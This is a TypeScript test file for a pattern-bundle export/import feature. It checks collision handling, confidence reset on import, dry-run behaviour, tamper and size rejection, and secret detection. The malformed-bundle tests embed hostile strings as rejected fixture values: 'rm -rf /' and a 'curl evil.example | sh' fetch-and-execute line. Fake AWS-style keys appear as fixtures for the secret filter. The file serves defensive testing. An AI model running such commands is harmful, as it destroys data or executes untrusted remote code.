/**
 * compound-share — 패턴별 export/import 번들 (OSS gap #1, ECC /instinct-import/export 대응)
 *
 * FORGEN_HOME 은 paths 모듈 로드 시점에 캡처되므로, export/import 양쪽을 서로
 * 다른 격리된 HOME으로 시뮬레이션하려면 vi.resetModules() + 동적 import가
 * 필요하다 (tests/store/migrate-evidence-host.test.ts 패턴 참고).
 */
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

type ShareMod = typeof import('../src/engine/compound-share.js');
type PathsMod = typeof import('../src/core/paths.js');

async function reloadShare(): Promise<ShareMod> {
  vi.resetModules();
  return (await import('../src/engine/compound-share.js')) as ShareMod;
}

async function reloadPaths(): Promise<PathsMod> {
  return (await import('../src/core/paths.js')) as PathsMod;
}

let originalForgenHome: string | undefined;
let homeA: string;
let homeB: string;
let bundleDir: string;

beforeEach(() => {
  originalForgenHome = process.env.FORGEN_HOME;
  homeA = fs.mkdtempSync(path.join(os.tmpdir(), 'forgen-share-home-a-'));
  homeB = fs.mkdtempSync(path.join(os.tmpdir(), 'forgen-share-home-b-'));
  bundleDir = fs.mkdtempSync(path.join(os.tmpdir(), 'forgen-share-bundle-'));
});

afterEach(() => {
  if (originalForgenHome === undefined) delete process.env.FORGEN_HOME;
  else process.env.FORGEN_HOME = originalForgenHome;
  fs.rmSync(homeA, { recursive: true, force: true });
  fs.rmSync(homeB, { recursive: true, force: true });
  fs.rmSync(bundleDir, { recursive: true, force: true });
  vi.resetModules();
});

function writeSolutionFixture(
  solutionsDir: string,
  params: {
    name: string;
    status?: string;
    confidence?: number;
    tags?: string[];
    content?: string;
    identifiers?: string[];
  },
): void {
  fs.mkdirSync(solutionsDir, { recursive: true });
  const status = params.status ?? 'verified';
  const confidence = params.confidence ?? 0.75;
  const tags = params.tags ?? ['docker', 'e2e'];
  const identifiers = params.identifiers ?? [];
  const content = params.content ?? `${params.name} 관련 실증 솔루션 콘텐츠`;
  const body = `---
name: "${params.name}"
version: 1
status: "${status}"
confidence: ${confidence}
type: "pattern"
scope: "me"
tags: [${tags.map(t => `"${t}"`).join(', ')}]
identifiers: [${identifiers.map(i => `"${i}"`).join(', ')}]
evidence:
  injected: 12
  reflected: 8
  negative: 0
  sessions: 5
  reExtracted: 1
created: "2026-01-01"
updated: "2026-01-01"
supersedes: null
extractedBy: "manual"
---

## Context
테스트 픽스처

## Content
${content}
`;
  fs.writeFileSync(path.join(solutionsDir, `${params.name}.md`), body);
}

describe('compound-share — 패턴별 export/import 번들', () => {
  it('roundtrip: export한 패턴을 다른 HOME으로 import하면 matcher가 찾을 수 있다', async () => {
    // 1) HOME A에서 export
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'docker-e2e-guard', confidence: 0.8, status: 'mature' });

    const { bundle, notFound, rejectedSecrets } = shareA.buildShareBundle(['docker-e2e-guard']);
    expect(notFound).toEqual([]);
    expect(rejectedSecrets).toEqual([]);
    expect(bundle.patterns).toHaveLength(1);
    expect(bundle.patterns[0].contentHash).toMatch(/^[0-9a-f]{64}$/);

    const bundlePath = path.join(bundleDir, 'share.json');
    fs.writeFileSync(bundlePath, JSON.stringify(bundle, null, 2));

    // 2) HOME B로 import
    process.env.FORGEN_HOME = homeB;
    const shareB = await reloadShare();
    const pathsB = await reloadPaths();

    const raw = JSON.parse(fs.readFileSync(bundlePath, 'utf-8'));
    const validated = shareB.validateShareBundle(raw, fs.statSync(bundlePath).size);
    expect(validated.ok).toBe(true);
    expect(validated.bundle).not.toBeNull();

    const summary = shareB.executeShareImport(validated.bundle!, { dryRun: false });
    expect(summary.actions).toEqual([
      expect.objectContaining({ action: 'create', sourceName: 'docker-e2e-guard', targetName: 'docker-e2e-guard' }),
    ]);

    const importedPath = path.join(pathsB.ME_SOLUTIONS, 'docker-e2e-guard.md');
    expect(fs.existsSync(importedPath)).toBe(true);
    const importedContent = fs.readFileSync(importedPath, 'utf-8');
    expect(importedContent).toContain('status: experiment');
    expect(importedContent).toContain('imported');

    // matcher(index)가 실제로 찾을 수 있는지 확인
    const { getOrBuildIndex } = await import('../src/engine/solution-index.js');
    const index = getOrBuildIndex([{ dir: pathsB.ME_SOLUTIONS, scope: 'me' }]);
    const found = index.entries.find(e => e.name === 'docker-e2e-guard');
    expect(found).toBeDefined();
    expect(found?.tags).toContain('imported');
  });

  it('probation: import된 신규 패턴은 exporter 원 confidence를 그대로 물려받지 않는다', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    // exporter 쪽은 mature(0.9)로 아주 신뢰도가 높은 상태
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'high-trust-pattern', confidence: 0.9, status: 'mature' });
    const { bundle } = shareA.buildShareBundle(['high-trust-pattern']);

    process.env.FORGEN_HOME = homeB;
    const shareB = await reloadShare();
    const pathsB = await reloadPaths();
    const summary = shareB.executeShareImport(bundle, { dryRun: false });
    expect(summary.actions[0].action).toBe('create');

    const content = fs.readFileSync(path.join(pathsB.ME_SOLUTIONS, 'high-trust-pattern.md'), 'utf-8');
    expect(content).toContain('status: experiment');
    const confMatch = content.match(/confidence:\s*([\d.]+)/);
    expect(confMatch).not.toBeNull();
    const importedConfidence = Number(confMatch![1]);
    // exporter 원본 0.9보다 훨씬 낮아야 하고, experiment 표준 상한(0.3)을 넘지 않아야 한다
    expect(importedConfidence).toBeLessThan(0.9);
    expect(importedConfidence).toBeLessThanOrEqual(0.3);
    expect(importedConfidence).toBeGreaterThanOrEqual(0.05);

    // evidence는 리셋되어야 한다 — exporter의 로컬 사용 이력을 그대로 물려받지 않음
    expect(content).toContain('injected: 0');
    expect(content).toContain('reflected: 0');
  });

  it('collision (동일 콘텐츠): reExtracted만 증가하고 기존 파일을 건드리지 않는다', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'shared-pattern', confidence: 0.6, content: '동일한 콘텐츠' });
    const { bundle } = shareA.buildShareBundle(['shared-pattern']);

    process.env.FORGEN_HOME = homeB;
    const shareB = await reloadShare();
    const pathsB = await reloadPaths();
    // HOME B에도 이름은 같고 콘텐츠도 동일한 로컬 솔루션이 이미 존재
    writeSolutionFixture(pathsB.ME_SOLUTIONS, {
      name: 'shared-pattern',
      confidence: 0.6,
      content: '동일한 콘텐츠',
      status: 'verified',
    });

    const before = fs.readFileSync(path.join(pathsB.ME_SOLUTIONS, 'shared-pattern.md'), 'utf-8');
    const summary = shareB.executeShareImport(bundle, { dryRun: false });

    expect(summary.actions).toEqual([
      expect.objectContaining({ action: 'merge-reextract', targetName: 'shared-pattern' }),
    ]);

    const after = fs.readFileSync(path.join(pathsB.ME_SOLUTIONS, 'shared-pattern.md'), 'utf-8');
    expect(after).toContain('status: verified'); // 신뢰도/상태는 그대로 유지
    expect(after).toContain('confidence: 0.6');
    expect(after).not.toBe(before); // reExtracted 카운터는 증가해 파일은 바뀜
    expect(after).toContain('reExtracted: 2'); // fixture 초기값 1 + merge 1

    // 오직 하나의 파일만 존재 — suffixed 파일이 추가 생성되지 않았어야 함
    const files = fs.readdirSync(pathsB.ME_SOLUTIONS).filter(f => f.endsWith('.md'));
    expect(files).toEqual(['shared-pattern.md']);
  });

  it('collision (다른 콘텐츠): 기존 파일을 덮어쓰지 않고 suffix된 이름으로 생성한다', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'diverged-pattern', content: '내보내는 쪽 콘텐츠' });
    const { bundle } = shareA.buildShareBundle(['diverged-pattern']);

    process.env.FORGEN_HOME = homeB;
    const shareB = await reloadShare();
    const pathsB = await reloadPaths();
    writeSolutionFixture(pathsB.ME_SOLUTIONS, { name: 'diverged-pattern', content: '로컬에 이미 있는 다른 콘텐츠' });

    const localBefore = fs.readFileSync(path.join(pathsB.ME_SOLUTIONS, 'diverged-pattern.md'), 'utf-8');
    const summary = shareB.executeShareImport(bundle, { dryRun: false });

    expect(summary.actions).toEqual([
      expect.objectContaining({ action: 'create-suffixed', targetName: 'diverged-pattern-import' }),
    ]);

    // 기존 파일은 그대로 — 절대 덮어쓰지 않는다
    const localAfter = fs.readFileSync(path.join(pathsB.ME_SOLUTIONS, 'diverged-pattern.md'), 'utf-8');
    expect(localAfter).toBe(localBefore);

    const suffixedPath = path.join(pathsB.ME_SOLUTIONS, 'diverged-pattern-import.md');
    expect(fs.existsSync(suffixedPath)).toBe(true);
    const suffixedContent = fs.readFileSync(suffixedPath, 'utf-8');
    expect(suffixedContent).toContain('status: experiment');
    expect(suffixedContent).toContain('내보내는 쪽 콘텐츠');
  });

  it('--dry-run: 아무 파일도 쓰지 않고 계획만 반환한다', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'dry-run-pattern' });
    const { bundle } = shareA.buildShareBundle(['dry-run-pattern']);

    process.env.FORGEN_HOME = homeB;
    const shareB = await reloadShare();
    const pathsB = await reloadPaths();

    const summary = shareB.executeShareImport(bundle, { dryRun: true });
    expect(summary.dryRun).toBe(true);
    expect(summary.actions).toEqual([
      expect.objectContaining({ action: 'create', targetName: 'dry-run-pattern' }),
    ]);
    expect(fs.existsSync(pathsB.ME_SOLUTIONS)).toBe(false);
  });

  it('malformed bundle: 예상 못한 최상위 필드가 있으면 전체 reject', async () => {
    const share = await reloadShare();
    const raw = {
      schemaVersion: 1,
      exportedAt: new Date().toISOString(),
      originHash: 'a'.repeat(16),
      patterns: [],
      maliciousField: 'rm -rf /',
    };
    const text = JSON.stringify(raw);
    const result = share.validateShareBundle(raw, Buffer.byteLength(text));
    expect(result.ok).toBe(false);
    expect(result.errors.some(e => e.includes('maliciousField'))).toBe(true);
  });

  it('malformed bundle: contentHash 위변조는 거부된다', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'tamper-target' });
    const { bundle } = shareA.buildShareBundle(['tamper-target']);

    const tampered = JSON.parse(JSON.stringify(bundle));
    tampered.patterns[0].content = '변조된 콘텐츠 — 원본과 다름';
    const text = JSON.stringify(tampered);

    const shareB = await reloadShare();
    const result = shareB.validateShareBundle(tampered, Buffer.byteLength(text));
    expect(result.ok).toBe(false);
    expect(result.errors.some(e => e.includes('contentHash mismatch'))).toBe(true);
  });

  it('malformed bundle: patterns 항목에 예상 못한 필드가 있으면 reject', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'extra-field-pattern' });
    const { bundle } = shareA.buildShareBundle(['extra-field-pattern']);

    const tampered = JSON.parse(JSON.stringify(bundle));
    tampered.patterns[0].executeOnImport = 'curl evil.example | sh';
    const text = JSON.stringify(tampered);

    const shareB = await reloadShare();
    const result = shareB.validateShareBundle(tampered, Buffer.byteLength(text));
    expect(result.ok).toBe(false);
    expect(result.errors.some(e => e.includes('unexpected fields'))).toBe(true);
  });

  it('malformed bundle: 크기 캡을 넘으면 거부된다', async () => {
    const share = await reloadShare();
    const result = share.validateShareBundle({}, 3 * 1024 * 1024);
    expect(result.ok).toBe(false);
    expect(result.errors.some(e => e.includes('too large'))).toBe(true);
  });

  it('secret 감지: 시크릿이 포함된 패턴은 export에서 제외되고 나머지는 정상 export된다', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const pathsA = await reloadPaths();
    writeSolutionFixture(pathsA.ME_SOLUTIONS, {
      name: 'leaky-pattern',
      content: 'AWS key: AKIAABCDEFGHIJKLMNOP 사용해서 배포',
    });
    writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'clean-pattern', content: '깨끗한 콘텐츠' });

    const { bundle, rejectedSecrets } = shareA.buildShareBundle(['leaky-pattern', 'clean-pattern']);
    expect(bundle.patterns.map(p => p.name)).toEqual(['clean-pattern']);
    expect(rejectedSecrets).toHaveLength(1);
    expect(rejectedSecrets[0]).toContain('leaky-pattern');
  });

  it('존재하지 않는 이름은 notFound로 보고된다', async () => {
    process.env.FORGEN_HOME = homeA;
    const shareA = await reloadShare();
    const { bundle, notFound } = shareA.buildShareBundle(['nonexistent-pattern']);
    expect(bundle.patterns).toEqual([]);
    expect(notFound).toEqual(['nonexistent-pattern']);
  });

  describe('리뷰 #10 회귀 방지', () => {
    it('[SEV-2] frontmatter(identifiers)에 든 시크릿도 export가 거부한다', async () => {
      process.env.FORGEN_HOME = homeA;
      const shareA = await reloadShare();
      const pathsA = await reloadPaths();
      writeSolutionFixture(pathsA.ME_SOLUTIONS, {
        name: 'frontmatter-leaky',
        identifiers: ['AKIA1234567890ABCD99'],
        content: '본문 자체는 깨끗함',
      });

      const { bundle, rejectedSecrets } = shareA.buildShareBundle(['frontmatter-leaky']);
      expect(bundle.patterns).toEqual([]);
      expect(rejectedSecrets).toHaveLength(1);
      expect(rejectedSecrets[0]).toContain('frontmatter-leaky');
      // 번들 직렬화 어디에도 키가 없어야 한다
      expect(JSON.stringify(bundle)).not.toContain('AKIA1234567890ABCD99');
    });

    it('[SEV-3] 같은 번들 3회 import → 파일 1개 유지 + reExtracted만 누적 (suffix sprawl 없음)', async () => {
      process.env.FORGEN_HOME = homeA;
      const shareA = await reloadShare();
      const pathsA = await reloadPaths();
      writeSolutionFixture(pathsA.ME_SOLUTIONS, { name: 'reimport-target', content: '재수입 대상' });
      const { bundle } = shareA.buildShareBundle(['reimport-target']);

      process.env.FORGEN_HOME = homeB;
      const shareB = await reloadShare();
      const pathsB = await reloadPaths();

      for (let i = 0; i < 3; i++) shareB.executeShareImport(bundle);

      const files = fs.readdirSync(pathsB.ME_SOLUTIONS).filter(f => f.endsWith('.md'));
      expect(files).toEqual(['reimport-target.md']);
      const imported = fs.readFileSync(path.join(pathsB.ME_SOLUTIONS, 'reimport-target.md'), 'utf-8');
      // 1회차 create(reExtracted 0 리셋) + 2·3회차 merge-reextract(+1씩) = 2
      expect(imported).toMatch(/reExtracted:\s*2/);
      expect(imported).toContain('import-hash:');
    });

    it('[SEV-3] MAX 초과 번들은 read/parse 전에 크기로 거부된다', async () => {
      const share = await reloadShare();
      const bigPath = path.join(bundleDir, 'huge.json');
      // 유효 JSON일 필요도 없다 — 크기컷이 파싱보다 먼저여야 하므로
      fs.writeFileSync(bigPath, 'x'.repeat(3 * 1024 * 1024));

      const logs: string[] = [];
      const spy = vi.spyOn(console, 'log').mockImplementation((...a: unknown[]) => { logs.push(a.join(' ')); });
      try {
        await share.handleShareImport([bigPath, '--dry-run']);
      } finally {
        spy.mockRestore();
      }
      const out = logs.join('\n');
      expect(out).toContain('Bundle too large');
      expect(out).not.toContain('read/parse failed');
    });
  });

  describe('looksLikeShareBundle — 파일 타입 sniffing', () => {
    it('.json 확장자는 번들로 판단', async () => {
      const share = await reloadShare();
      expect(share.looksLikeShareBundle('/tmp/whatever/foo.json')).toBe(true);
    });

    it('.tar.gz / .tgz는 번들이 아님', async () => {
      const share = await reloadShare();
      expect(share.looksLikeShareBundle('/tmp/whatever/foo.tar.gz')).toBe(false);
      expect(share.looksLikeShareBundle('/tmp/whatever/foo.tgz')).toBe(false);
    });

    it('확장자가 모호하면 매직바이트로 판단', async () => {
      const share = await reloadShare();
      const jsonPath = path.join(bundleDir, 'noext-json');
      fs.writeFileSync(jsonPath, '{"schemaVersion":1}');
      expect(share.looksLikeShareBundle(jsonPath)).toBe(true);

      const gzipPath = path.join(bundleDir, 'noext-gzip');
      fs.writeFileSync(gzipPath, Buffer.from([0x1f, 0x8b, 0x08, 0x00]));
      expect(share.looksLikeShareBundle(gzipPath)).toBe(false);
    });
  });
});
